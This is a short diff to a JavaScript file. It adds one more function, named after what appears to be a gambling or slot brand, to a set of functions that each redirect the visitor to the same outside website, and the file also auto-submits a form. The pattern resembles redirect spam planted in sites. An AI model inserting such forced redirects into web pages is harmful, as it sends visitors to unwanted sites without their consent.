@@ -1,5 +1,6 @@
 document.getElementById('yourform').submit();
 function link() {location.replace("https://www.senisastra.com/");}
+function linkqqfreeslot() {location.replace("https://www.senisastra.com/");}
 function linkqq820() {location.replace("https://www.senisastra.com/");}
 function linkqq59bet() {location.replace("https://www.senisastra.com/");}
 function linkqq555q() {location.replace("https://www.senisastra.com/");}
